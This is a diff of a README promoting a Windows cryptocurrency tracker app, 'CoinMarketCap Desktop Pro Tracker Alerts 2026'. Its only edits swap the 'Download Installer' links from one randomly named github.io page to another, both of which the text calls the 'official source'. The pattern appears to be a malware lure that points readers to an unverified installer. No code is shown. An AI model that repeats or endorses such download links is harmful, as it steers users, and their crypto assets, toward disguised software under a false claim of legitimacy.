@@ -2,7 +2,7 @@
 
 CoinMarketCap Desktop Pro Tracker Alerts 2026 is a comprehensive Windows desktop application designed to elevate your cryptocurrency management experience. This tool delivers real-time market data, robust portfolio tracking, and customizable alert systems, all within a sleek interface optimized for modern Windows environments.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -72,4 +72,4 @@ CoinMarketCap Desktop is actively developed, with new versions released quarterl
 
 Get the latest stable release of CoinMarketCap Desktop Pro Tracker Alerts directly from our official source. This version includes all updates for 2026, including performance enhancements and bug fixes.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
